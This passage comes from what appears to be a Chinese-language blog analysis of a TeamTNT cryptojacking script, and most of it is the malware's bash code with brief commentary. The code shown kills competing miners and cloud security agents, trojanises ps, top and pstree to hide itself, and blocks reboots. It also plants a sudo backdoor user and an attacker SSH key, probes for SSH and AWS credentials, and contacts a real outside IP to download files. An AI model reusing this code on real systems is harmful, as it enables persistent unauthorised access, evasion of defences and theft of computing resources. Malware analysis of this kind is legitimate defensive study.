rm -rf /var/tmp/xmrig
rm -rf /var/tmp/1.so
rm -rf /var/tmp/kworkerds3
rm -rf /var/tmp/kworkerdssx
rm -rf /var/tmp/kworkerds
rm -rf /var/tmp/wc.conf
rm -rf /var/tmp/nadezhda.
rm -rf /var/tmp/nadezhda.arm
rm -rf /var/tmp/nadezhda.arm.1
rm -rf /var/tmp/nadezhda.arm.2
rm -rf /var/tmp/nadezhda.x86_64
rm -rf /var/tmp/nadezhda.x86_64.1
rm -rf /var/tmp/nadezhda.x86_64.2
rm -rf /var/tmp/sustse3
rm -rf /var/tmp/sustse
rm -rf /var/tmp/moneroocean/
rm -rf /var/tmp/devtool
rm -rf /var/tmp/devtools
rm -rf /var/tmp/play.sh
rm -rf /var/tmp/systemctI
rm -rf /var/tmp/.java
rm -rf /var/tmp/1.sh
rm -rf /var/tmp/conf.n
rm -r /var/tmp/lib
rm -r /var/tmp/.lib
chattr -iau /tmp/lok
chmod +700 /tmp/lok
rm -rf /tmp/lok
sleep 1
chattr -i /tmp/kdevtmpfsi
echo 1 > /tmp/kdevtmpfsi
chattr +i /tmp/kdevtmpfsi
sleep 1
chattr -i /tmp/redis2
echo 1 > /tmp/redis2
chattr +i /tmp/redis2
chattr -ia /.Xll/xr
>/.Xll/xr
chattr +ia /.Xll/xr
chattr -ia /etc/trace
>/etc/trace
chattr +ia /etc/trace
chattr -ia /etc/newsvc.sh
chattr -ia /etc/svc*
chattr -ia /tmp/newsvc.sh
chattr -ia /tmp/svc*
>/etc/newsvc.sh
>/etc/svcupdate
>/etc/svcguard
>/etc/svcworkmanager
>/etc/svcupdates
>/tmp/newsvc.sh
>/tmp/svcupdate
>/tmp/svcguard
>/tmp/svcworkmanager
>/tmp/svcupdates
chattr +ia /etc/newsvc.sh
chattr +ia /etc/svc*
chattr +ia /tmp/newsvc.sh
chattr +ia /tmp/svc*
sleep 1
chattr -ia /etc/phpupdate
chattr -ia /etc/phpguard
chattr -ia /etc/networkmanager
chattr -ia /etc/newdat.sh
>/etc/phpupdate
>/etc/phpguard
>/etc/networkmanager
>/etc/newdat.sh
chattr +ia /etc/phpupdate
chattr +ia /etc/phpguard
chattr +ia /etc/networkmanager
chattr +ia /etc/newdat.sh
sleep 1
chattr -i /usr/lib/systemd/systemd-update-daily
echo 1 > /usr/lib/systemd/systemd-update-daily
chattr +i /usr/lib/systemd/systemd-update-daily
#yum install -y docker.io || apt-get install docker.io;
docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
#echo SELINUX=disabled >/etc/selinux/config
service apparmor stop
systemctl disable apparmor
service aliyun.service stop
systemctl disable aliyun.service
ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
rm -rf /usr/local/aegis
chattr -R -ia /var/spool/cron
chattr -ia /etc/crontab
chattr -R -ia /etc/cron.d
chattr -R -ia /var/spool/cron/crontabs
crontab -r
rm -rf /var/spool/cron/*
rm -rf /etc/cron.d/*
rm -rf /var/spool/cron/crontabs
rm -rf /etc/crontab
}
kill_miner_proc
```

这一部分是我觉得非常有趣的, 很长的一个函数, 占了整个脚本一半的行数.
函数的核心内容可以用一句话总结, 杀死其他的竞争对手. 有趣有趣, 知己知彼才能百战百胜.

```bash
kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "crypto"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "crypto"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}
kill_sus_proc
```

`$?` 是上一个命令的状态, 或函数的返回值.
这个函数的大概意思是杀死命令中有 crypto 字段的进程, 然后对 CPU 占用在 40 以上的进程重复了一遍杀死操作.

```bash
function SetupNameServers(){
grep -q 8.8.8.8 /etc/resolv.conf || chattr -i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.8.8" >> /etc/resolv.conf; chattr +i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht +i /etc/resolv.conf 2>/dev/null 1>/dev/null
grep -q 8.8.4.4 /etc/resolv.conf || chattr -i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.4.4" >> /etc/resolv.conf; chattr +i /etc/resolv.conf 2>/dev/null 1>/dev/null; tntrecht +i /etc/resolv.conf 2>/dev/null 1>/dev/null
}

SetupNameServers
```

### 准备作战

```bash
chattr -iR /var/spool/cron/
tntrecht -iR /var/spool/cron/
crontab -r

function clean_cron(){
chattr -R -ia /var/spool/cron
tntrecht -R -ia /var/spool/cron
chattr -ia /etc/crontab
tntrecht -ia /etc/crontab
chattr -R -ia /etc/cron.d
tntrecht -R -ia /etc/cron.d
chattr -R -ia /var/spool/cron/crontabs
tntrecht -R -ia /var/spool/cron/crontabs
crontab -r
rm -rf /var/spool/cron/*
rm -rf /etc/cron.d/*
rm -rf /var/spool/cron/crontabs
rm -rf /etc/crontab
}

clean_cron
```

开始要对定时任务下手了, 首先清空了其他的定时任务.

```bash
function lock_cron()
{
    chattr -R +ia /var/spool/cron
    tntrecht -R +ia /var/spool/cron
    touch /etc/crontab
    chattr +ia /etc/crontab
    tntrecht +ia /etc/crontab
    chattr -R +ia /var/spool/cron/crontabs
    tntrecht -R +ia /var/spool/cron/crontabs
    chattr -R +ia /etc/cron.d
    tntrecht -R +ia /etc/cron.d
}

lock_cron
```

然后锁定了定时任务相关的文件和目录.

接着, 又开始了对密钥的检测.

```bash
function CheckAboutSomeKeys(){
    if [ -f "/root/.ssh/id_rsa" ]
    then
		echo 'found: /root/.ssh/id_rsa'
    fi

    if [ -f "/home/*/.ssh/id_rsa" ]
    then
		echo 'found: /home/*/.ssh/id_rsa'
    fi

    if [ -f "/root/.aws/credentials" ]
    then
		echo 'found: /root/.aws/credentials'
    fi

    if [ -f "/home/*/.aws/credentials" ]
    then
		echo 'found: /home/*/.aws/credentials'
    fi
}

CheckAboutSomeKeys
```

停止了一个叫做 `crypto` 的服务, 但我也不知道这个 TeamTNT 是干嘛的, 网上搜出来的结果好像是一个挖矿组织.

```
if [ -f "/usr/bin/TeamTNT/[crypto]" ]
then
service crypto stop
rm -fr /usr/bin/TeamTNT/
fi
```

然后是一个美其名曰为 `净化系统` 的函数, 实质上是重写了 `ps`, `top`, `pstree` 命令, 将 `crypto|pnscan` 从输出结果中过滤掉了.

```bash
function SecureTheSystem(){
    if [ -f "/bin/ps.original" ]
    then
        echo "/bin/ps changed"
    else
        mv /bin/ps /bin/ps.original
        echo "#! /bin/bash">>/bin/ps
        echo "ps.original \$@ | grep -v \"crypto\|pnscan\"">>/bin/ps
        chmod +x /bin/ps
                touch -d 20160825 /bin/ps
        echo "/bin/ps changing"
    fi
    if [ -f "/bin/top.original" ]
    then
        echo "/bin/top changed"
    else
        mv /bin/top /bin/top.original
        echo "#! /bin/bash">>/bin/top
        echo "top.original \$@ | grep -v \"crypto\|pnscan\"">>/bin/top
        chmod +x /bin/top
                touch -d 20160825 /bin/top
        echo "/bin/top changing"
    fi
    if [ -f "/bin/pstree.original" ]
    then
        echo "/bin/pstree changed"
    else
        mv /bin/pstree /bin/pstree.original
        echo "#! /bin/bash">>/bin/pstree
        echo "pstree.original \$@ | grep -v \"crypto\|pnscan\"">>/bin/pstree
        chmod +x /bin/pstree
                touch -d 20160825 /bin/pstree
        echo "/bin/pstree changing"
    fi
    if [ -f "/bin/chattr" ]
        then
                chattrsize=`ls -l /bin/chattr | awk '{ print $5 }'`
                if [ "$chattrsize" -lt "$chattr_size" ]
                then
            yum -y remove e2fsprogs
            yum -y install e2fsprogs
                else
                        echo "no need install chattr"
                fi
        else
            yum -y remove e2fsprogs
            yum -y install e2fsprogs
    fi
}
```

然后又防止重启系统.

```bash
function LockDownTheSystem(){
LOCKDOWNARRAY=(shutdown reboot poweroff telinit)
for LOCKDOWN in ${LOCKDOWNARRAY[@]}; do
LOCKDOWNBIN=`which $LOCKDOWN` 2>/dev/null 1>/dev/null
chattr -i $LOCKDOWNBIN 2>/dev/null 1>/dev/null
tntrecht -i $LOCKDOWNBIN 2>/dev/null 1>/dev/null
chattr -x $LOCKDOWNBIN 2>/dev/null 1>/dev/null
#chmod 000 $LOCKDOWNBIN 2>/dev/null 1>/dev/null
chattr +i $LOCKDOWNBIN 2>/dev/null 1>/dev/null
tntrecht +i $LOCKDOWNBIN 2>/dev/null 1>/dev/null
done

chattr +i /proc/sysrq-trigger 2>/dev/null 1>/dev/null
tntrecht +i /proc/sysrq-trigger 2>/dev/null 1>/dev/null


LOCKDOWNFILES=("/lib/systemd/system/reboot.target" "/lib/systemd/system/systemd-reboot.service")
for LOCKDOWNFILE in ${LOCKDOWNFILES[@]}; do

chattr -i $LOCKDOWNFILE 2>/dev/null 1>/dev/null
tntrecht -i $LOCKDOWNFILE 2>/dev/null 1>/dev/null
chattr -x $LOCKDOWNFILE 2>/dev/null 1>/dev/null
> $LOCKDOWNFILE
rm -f $LOCKDOWNFILE 2>/dev/null 1>/dev/null
done

}
```

当然了, 系统的资源是有限的, 先把竞争对手搞死.

```bash
function KILLMININGSERVICES(){

echo "[*] Removing previous miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop crypto.service
fi
killall -9 xmrig
echo "do KILLMININGSERVICES"

$(docker rm $(docker ps | grep -v grep | grep "/bin/bash -c 'apt" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
#$(docker rm $(docker ps | grep -v grep | grep "/bin/bash" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "/root/startup.sh" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)

$(docker rm $(docker ps | grep -v grep | grep "widoc26117/xmr" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "zbrtgwlxz" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)
$(docker rm $(docker ps | grep -v grep | grep "tail -f /dev/null" | awk '{print $1}') -f 2>/dev/null 1>/dev/null)


rm -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
pkill -f /usr/bin/docker-update 2>/dev/null 1>/dev/null
killall -9 docker-update  2>/dev/null 1>/dev/null

rm -f /usr/bin/redis-backup 2>/dev/null 1>/dev/null
pkill -f /usr/bin/redis-backup 2>/dev/null 1>/dev/null
killall -9 redis-backup 2>/dev/null 1>/dev/null

rm -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
pkill -f /tmp/moneroocean/xmrig 2>/dev/null 1>/dev/null
rm -fr /tmp/moneroocean/ 2>/dev/null 1>/dev/null
killall -9 xmrig 2>/dev/null 1>/dev/null

LOCKFILE='IyEvYmluL2Jhc2gKZWNobyAnRm9yYmlkZGVuIGFjdGlvbiAhISEgVGVhbVROVCBpcyB3YXRjaGluZyB5b3UhJw=='

if [ ! -f /usr/bin/tntrecht ]; then
chattrbin=`which chattr`
cp $chattrbin /usr/bin/tntrecht 2>/dev/null 1>/dev/null
chmod +x /usr/bin/tntrecht 2>/dev/null 1>/dev/null
chmod -x $chattrbin 2>/dev/null 1>/dev/null
tntrecht +i $chattrbin 2>/dev/null 1>/dev/null
fi

LOCKFILE='IyEvYmluL2Jhc2gKZWNobyAnRm9yYmlkZGVuIGFjdGlvbiAhISEgVGVhbVROVCBpcyB3YXRjaGluZyB5b3UhJw=='

if [ -f /root/.tmp/xmrig ]; then
chattr -iR /root/.tmp/ 2>/dev/null 1>/dev/null
tntrecht -iR /root/.tmp/ 2>/dev/null 1>/dev/null
tmpxmrig=("/root/.tmp/config.json" "/root/.tmp/config_background.json" "/root/.tmp/xmrig.log" "/root/.tmp/miner.sh" "/root/.tmp/xmrig")
for tmpxmrigfile in ${tmpxmrig[@]}; do
rm -f $tmpxmrigfile 2>/dev/null 1>/dev/null
pkill -f $tmpxmrigfile 2>/dev/null 1>/dev/null
kill $(pidof $tmpxmrigfile) 2>/dev/null 1>/dev/null
echo $LOCKFILE | base64 -d > $tmpxmrigfile
chmod +x $tmpxmrigfile 2>/dev/null 1>/dev/null
chattr +i $tmpxmrigfile 2>/dev/null 1>/dev/null
tntrecht +i $tmpxmrigfile 2>/dev/null 1>/dev/null
pkill -f $tmpxmrigfile 2>/dev/null 1>/dev/null
kill $(pidof $tmpxmrigfile) 2>/dev/null 1>/dev/null
killall $tmpxmrigfile 2>/dev/null 1>/dev/null
chmod -x /root/.tmp/xmrig 2>/dev/null 1>/dev/null
rm -f /root/.tmp/xmrig 2>/dev/null 1>/dev/null
chattr +i /root/.tmp/xmrig 2>/dev/null 1>/dev/null
tntrecht +i /root/.tmp/xmrig 2>/dev/null 1>/dev/null
pkill -f /root/.tmp/xmrig 2>/dev/null 1>/dev/null
ps ax| grep xmrig 2>/dev/null 1>/dev/null
done
fi

if [ -f /usr/sbin/cpumon ]; then
cpumonxmr=("/usr/sbin/cpumon" "/usr/cpu")
for cpumonfile in ${cpumonxmr[@]}; do
chattr -i $cpumonfile 2>/dev/null 1>/dev/null
tntrecht -i $cpumonfile 2>/dev/null 1>/dev/null
rm -f $cpumonfile 2>/dev/null 1>/dev/null
pkill -f $cpumonfile 2>/dev/null 1>/dev/null
kill $(pidof $cpumonfile) 2>/dev/null 1>/dev/null
echo $LOCKFILE | base64 -d > $cpumonfile
chmod +x $cpumonfile 2>/dev/null 1>/dev/null
chattr +i $cpumonfile 2>/dev/null 1>/dev/null
tntrecht +i $cpumonfile 2>/dev/null 1>/dev/null
pkill -f $cpumonfile 2>/dev/null 1>/dev/null
kill $(pidof $cpumonfile) 2>/dev/null 1>/dev/null
killall $cpumonfile 2>/dev/null 1>/dev/null
done
fi

if [ -f /opt/server ]; then
chattr -i /opt/server 2>/dev/null 1>/dev/null
tntrecht -i /opt/server 2>/dev/null 1>/dev/null
rm -f /opt/server 2>/dev/null 1>/dev/null
pkill -f /opt/server 2>/dev/null 1>/dev/null
kill $(pidof /opt/server) 2>/dev/null 1>/dev/null
fi

if [ -f /tmp/log_rotari ]; then
chattr -i /tmp/log_rotari 2>/dev/null 1>/dev/null
tntrecht -i /tmp/log_rotari 2>/dev/null 1>/dev/null
rm -f /tmp/log_rotari 2>/dev/null 1>/dev/null
pkill -f /tmp/log_rotari 2>/dev/null 1>/dev/null
kill $(pidof /tmp/log_rotari) 2>/dev/null 1>/dev/null
fi

BASH00=$(ps ax | grep -v grep |  grep "/root/.tmp00/bash")
if [ ! -z "$BASH00" ];
then
chattr -i /var/spool/cron/root 2>/dev/null 1>/dev/null
tntrecht -i /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod 1777 /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod -x /var/spool/cron/root 2>/dev/null 1>/dev/null
echo " " > /var/spool/cron/root 2>/dev/null 1>/dev/null
rm -f /var/spool/cron/root 2>/dev/null 1>/dev/null
chattr -i /root/.tmp00/bash 2>/dev/null 1>/dev/null
tntrecht -i /root/.tmp00/bash 2>/dev/null 1>/dev/null
chmod -x /root/.tmp00/bash 2>/dev/null 1>/dev/null
pkill -f /root/.tmp00/bash 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/root/.tmp00/bash" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /root/.tmp00/bash) 2>/dev/null 1>/dev/null
echo " " > /root/.tmp00/bash 2>/dev/null 1>/dev/null
rm -f /root/.tmp00/bash 2>/dev/null 1>/dev/null
echo $StringToLock > /root/.tmp00/bash
chattr +i /root/.tmp00/bash 2>/dev/null 1>/dev/null
tntrecht +i /root/.tmp00/bash 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

BASH6400=$(ps ax | grep -v grep |  grep "/root/.tmp00/bash64")
if [ ! -z "$BASH6400" ];
then
chattr -i /var/spool/cron/root 2>/dev/null 1>/dev/null
tntrecht -i /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod 1777 /var/spool/cron/root 2>/dev/null 1>/dev/null
chmod -x /var/spool/cron/root 2>/dev/null 1>/dev/null
echo " " > /var/spool/cron/root 2>/dev/null 1>/dev/null
rm -f /var/spool/cron/root 2>/dev/null 1>/dev/null
chattr -i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
tntrecht -i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
chmod -x /root/.tmp00/bash64 2>/dev/null 1>/dev/null
pkill -f /root/.tmp00/bash64 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/root/.tmp00/bash64" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /root/.tmp00/bash64) 2>/dev/null 1>/dev/null
echo " " > /root/.tmp00/bash64 2>/dev/null 1>/dev/null
rm -f /root/.tmp00/bash64 2>/dev/null 1>/dev/null
echo $StringToLock > /root/.tmp00/bash64
chattr +i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
tntrecht +i /root/.tmp00/bash64 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

KINSING1=$(ps ax | grep -v grep |  grep "/var/tmp/kinsing")
if [ ! -z "$KINSING1" ];
then
chattr -i /var/tmp/kinsing 2>/dev/null 1>/dev/null
tntrecht -i /var/tmp/kinsing 2>/dev/null 1>/dev/null
chmod -x /var/tmp/kinsing 2>/dev/null 1>/dev/null
pkill -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/var/tmp/kinsing" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /var/tmp/kinsing) 2>/dev/null 1>/dev/null
echo " " > /var/tmp/kinsing 2>/dev/null 1>/dev/null
rm -f /var/tmp/kinsing 2>/dev/null 1>/dev/null
echo $StringToLock > /var/tmp/kinsing
chattr +i /var/tmp/kinsing 2>/dev/null 1>/dev/null
tntrecht +i /var/tmp/kinsing 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

KINSING2=$(ps ax | grep -v grep |  grep "/tmp/kdevtmpfsi")
if [ ! -z "$KINSING2" ];
then
chattr -i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
tntrecht -i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
chmod -x /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
pkill -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
kill $(ps ax | grep -v grep | grep "/tmp/kdevtmpfsi" | awk '{print $1}') 2>/dev/null 1>/dev/null
kill $(pidof /tmp/kdevtmpfsi) 2>/dev/null 1>/dev/null
echo " " > /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
rm -f /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
echo $StringToLock > /tmp/kdevtmpfsi
chattr +i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
tntrecht +i /tmp/kdevtmpfsi 2>/dev/null 1>/dev/null
history -c 2>/dev/null 1>/dev/null
fi

kill $(ps aux | grep -vw crypto | grep -v grep |grep -v scan | grep -vw "/usr/bin/xmrigMiner" | grep -vw "./shell"  | awk '{if($3>40.0) print $2}')

}
```

接着, 开始准备密钥了.

```bash
function makesshaxx(){
	RSAKEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCmEFN80ELqVV9enSOn+05vOhtmmtuEoPFhompw+bTIaCDsU5Yn2yD77Yifc/yXh3O9mg76THr7vxomguO040VwQYf9+vtJ6CGtl7NamxT8LYFBgsgtJ9H48R9k6H0rqK5Srdb44PGtptZR7USzjb02EUq/15cZtfWnjP9pKTgscOvU6o1Jpos6kdlbwzNggdNrHxKqps0so3GC7tXv/GFlLVWEqJRqAVDOxK4Gl2iozqxJMO2d7TCNg7d3Rr3w4xIMNZm49DPzTWQcze5XciQyNoNvaopvp+UlceetnWxI1Kdswi0VNMZZOmhmsMAtirB3yR10DwH3NbEKy+ohYqBL root@puppetserver"
	grep -q hilde /etc/passwd || chattr -ia /etc/passwd;
	grep -q hilde /etc/passwd || tntrecht -ia /etc/passwd;
	grep -q hilde /etc/passwd || echo 'hilde:x:1000:1000::/home/hilde:/bin/bash' >> /etc/passwd; chattr +ia /etc/passwd; tntrecht +ia /etc/passwd
	grep -q hilde /etc/shadow || chattr -ia /etc/shadow;
	grep -q hilde /etc/shadow || tntrecht -ia /etc/shadow;
	grep -q hilde /etc/shadow || echo 'hilde:$6$7n/iy4R6znS2iq0J$QjcECLSqMMiUUeHR4iJmkHLzAwgoNRhCC87HI3df95nZH5569TKwJEN2I/lNanPe0vhsdgfILPXedlWlZn7lz0:18461:0:99999:7:::' >> /etc/shadow; chattr +ia /etc/shadow; tntrecht +ia /etc/shadow
	grep -q hilde /etc/sudoers || chattr -ia /etc/sudoers;
	grep -q hilde /etc/sudoers || tntrecht -ia /etc/sudoers;
	grep -q hilde /etc/sudoers || echo 'hilde  ALL=(ALL:ALL) ALL' >> /etc/sudoers; chattr +i /etc/sudoers; tntrecht +i /etc/sudoers

	mkdir /home/hilde/.ssh/ -p
	touch /home/hilde/.ssh/authorized_keys
	touch /home/hilde/.ssh/authorized_keys2
	grep -q root@puppetserver /home/hilde/.ssh/authorized_keys || chattr -ia /home/hilde/.ssh/authorized_keys;
	grep -q root@puppetserver /home/hilde/.ssh/authorized_keys || tntrecht -ia /home/hilde/.ssh/authorized_keys;
	grep -q root@puppetserver /home/hilde/.ssh/authorized_keys || echo $RSAKEY > /home/hilde/.ssh/authorized_keys; chattr +ia /home/hilde/.ssh/authorized_keys; tntrecht +ia /home/hilde/.ssh/authorized_keys;
	curl  http://199.19.226.117/b2f628/dream.txt >>/dev/null
	cur http://199.19.226.117/b2f628/dream.txt >>/dev/null
	cd1 http://199.19.226.117/b2f628/dream.txt >>/dev/null
	TNTcurl http://199.19.226.117/b2f628/dream.txt >>/dev/null
	wget -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
	wge -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
	wd1 -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
	TNTwget -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
	grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 || chattr -ia /home/hilde/.ssh/authorized_keys2;
	grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 || tntrecht -ia /home/hilde/.ssh/authorized_keys2;
	grep -q root@puppetserver /home/hilde/.ssh/authorized_keys2 || echo $RSAKEY > /home/hilde/.ssh/authorized_keys2; chattr +ia /home/hilde/.ssh/authorized_keys2; tntrecht +ia /home/hilde/.ssh/authorized_keys2;
	mkdir /root/.ssh/ -p
	touch /root/.ssh/authorized_keys
	touch /root/.ssh/authorized_keys
	grep -q root@puppetserver /root/.ssh/authorized_keys || chattr -ia /root/.ssh/authorized_keys;
	grep -q root@puppetserver /root/.ssh/authorized_keys || tntrecht -ia /root/.ssh/authorized_keys;
	grep -q root@puppetserver /root/.ssh/authorized_keys || echo $RSAKEY >> /root/.ssh/authorized_keys; chattr +ia /root/.ssh/authorized_keys; tntrecht +ia /root/.ssh/authorized_keys
	grep -q root@puppetserver /root/.ssh/authorized_keys2 || chattr -ia /root/.ssh/authorized_keys2;
	grep -q root@puppetserver /root/.ssh/authorized_keys2 || tntrecht -ia /root/.ssh/authorized_keys2;
	grep -q root@puppetserver /root/.ssh/authorized_keys2 || echo $RSAKEY > /root/.ssh/authorized_keys2; chattr +ia /root/.ssh/authorized_keys2; tntrecht +ia /root/.ssh/authorized_keys2
}
```

然后, 开始用各种方式开始下载这个文件.

```bash
curl http://199.19.226.117/b2f628/dream.txt >>/dev/null
cur http://199.19.226.117/b2f628/dream.txt >>/dev/null
cd1 http://199.19.226.117/b2f628/dream.txt >>/dev/null
TNTcurl http://199.19.226.117/b2f628/dream.txt >>/dev/null
wget -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
wge -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
wd1 -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
TNTwget -q -O- http://199.19.226.117/b2f628/dream.txt >>/dev/null
```

开始连接 ssh 隧道了.

```bash
function CreateSshPunker(){
if [ ! -f "/usr/bin/pu"]
then
echo 'IyEvdXN/太长写不下了, 就是把二进制数据拷进去'
fi
}

function checksshkeys(){
if [ -f /root/.ssh/id_rsa ]; then
echo "found rsa"
CreateSshPunker
fi

if [ -f /home/*/.ssh/id_rsa ]; then
echo "found rsa"
CreateSshPunker
fi
}
```

### 火力全开

```bash
function SetupMoneroOcean(){

######################### printing greetings ###########################
clear
echo -e " "
echo -e "                                \e[1;34;49m___________                 _____________________________\033[0m"
echo -e "                                \e[1;34;49m\__    ___/___ _____    ____\__    ___/\      \__    ___/\033[0m"
echo -e "                                \e[1;34;49m  |    |_/ __ \\__  \  /     \|    |   /   |   \|    |   \033[0m"
echo -e "                                \e[1;34;49m  |    |\  ___/ / __ \|  Y Y  \    |  /    |    \    |   \033[0m"
echo -e "                                \e[1;34;49m  |____| \___  >____  /__|_|  /____|  \____|__  /____|   \033[0m"
echo -e "                                \e[1;34;49m             \/     \/      \/                \/         \033[0m"
echo -e " "
echo -e "                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ "
echo -e " "
echo -e "                                \e[1;34;49m            Now you get, what i want to give... --- '''      \033[0m"
echo " "
echo " "



if [ "$(id -u)" == "0" ]; then
  echo "running as root... its all OKAY!"
else
  echo "running not as root... first starting tmp setup..."

fi

downloads()
{
    if [ -f "/usr/bin/curl" ]
    then
	echo $1,$2
        http_code=`curl -I -m 50 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 100 --retry 100 -sL -o $2 $1
        elif [ "$http_code" -eq "405" ]
        then
            curl --connect-timeout 100 --retry 100 -sL -o $2 $1
        else
            curl --connect-timeout 100 --retry 100 -sL -o $2 $3
        fi
    elif [ -f "/usr/bin/cd1" ]
    then
        http_code=`cd1 -I -m 50 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            cd1 --connect-timeout 100 --retry 100 -sL -o $2 $1
        elif [ "$http_code" -eq "405" ]
        then
            cd1 --connect-timeout 100 --retry 100 -sL -o $2 $1
        else
            cd1 --connect-timeout 100 --retry 100 -sL -o $2 $3
        fi
    elif [ -f "/usr/bin/wget" ]
    then
        wget --timeout=50 --tries=100 -O $2 $1
        if [ $? -ne 0 ]
	then
		wget --timeout=100 --tries=100 -O $2 $3
        fi
    elif [ -f "/usr/bin/wd1" ]
    then
        wd1 --timeout=100 --tries=100 -O $2 $1
        if [ $? -eq 0 ]
        then
            wd1 --timeout=100 --tries=100 -O $2 $3
        fi
    fi
}



# checking prerequisites

if [ -z $WALLET ]; then
  echo "ERROR: wallet"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $MOHOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $MOHOME ]; then
  echo "ERROR: Please make sure HOME directory $MOHOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
apt-get update --fix-missing 2>/dev/null 1>/dev/null
apt-get install -y curl 2>/dev/null 1>/dev/null
apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null
yum clean all 2>/dev/null 1>/dev/null
yum install -y curl 2>/dev/null 1>/dev/null
yum reinstall -y curl 2>/dev/null 1>/dev/null
fi


 if [ -f "$MOHOME/[crypto]" ]
 then
         echo "miner file exists"
 else
